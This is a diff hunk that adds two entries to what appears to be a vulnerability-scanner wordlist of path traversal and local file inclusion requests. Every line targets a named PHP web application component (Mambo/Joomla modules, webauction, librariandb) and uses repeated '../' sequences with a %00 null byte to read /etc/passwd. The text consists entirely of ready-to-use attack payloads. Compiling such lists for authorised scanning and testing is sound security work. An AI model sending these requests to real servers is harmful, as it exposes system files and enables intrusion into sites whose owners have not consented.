@@ -84,6 +84,8 @@ administrator/components/com_a6mambocredits/admin.a6mambocredits.php?mosConfig_a
 administrator/components/com_a6mambohelpdesk/admin.a6mambohelpdesk.php?mosConfig_live_site=../../../../../../../../../../../../../../../../etc/passwd%00
 administrator/components/com_colophon/admin.colophon.php?mosConfig_absolute_path=../../../../../../../../../../../../../../../../etc/passwd%00
 administrator/components/com_comprofiler/plugin.class.php?mosConfig_absolute_path=../../../../../../../../../../../../../../../../etc/passwd%00
+webauction/index.php?-table=books&-action=browse_by_cat&-cursor=0&-skip=0&-limit=30&-mode=list&-lang=../../../../../../../../../etc/passwd%00
+librariandb/index.php?-table=books&-action=browse_by_cat&-cursor=0&-skip=0&-limit=30&-mode=list&-lang=../../../../../../../../../etc/passwd%00
 administrator/components/com_mambelfish/mambelfish.class.php?mosConfig_absolute_path=../../../../../../../../../../../../../../../../etc/passwd%00
 administrator/components/com_uhp2/uhp_config.php?mosConfig_absolute_path=../../../../../../../../../../../../../../../../etc/passwd%00
 administrator/components/com_uhp/uhp_config.php?mosConfig_absolute_path=../../../../../../../../../../../../../../../../etc/passwd%00
